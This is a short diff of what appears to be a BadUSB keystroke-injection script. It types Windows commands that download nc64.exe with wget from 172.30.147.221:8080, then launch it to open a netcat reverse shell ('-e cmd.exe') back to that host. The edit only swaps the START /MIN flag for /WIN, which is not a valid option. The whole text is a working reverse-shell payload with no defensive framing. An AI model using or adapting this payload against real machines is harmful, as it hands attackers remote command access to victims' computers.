@@ -15,5 +15,5 @@ STRING cd / & mkdir win & cd win & echo (wget 'http://172.30.147.221:8080/nc64.e
 ENTER
 DELAY 3000
 
-STRING START /MIN a.exe 172.30.147.221 8080 -e cmd.exe -d & exit
+STRING START /WIN a.exe 172.30.147.221 8080 -e cmd.exe -d & exit
 ENTER
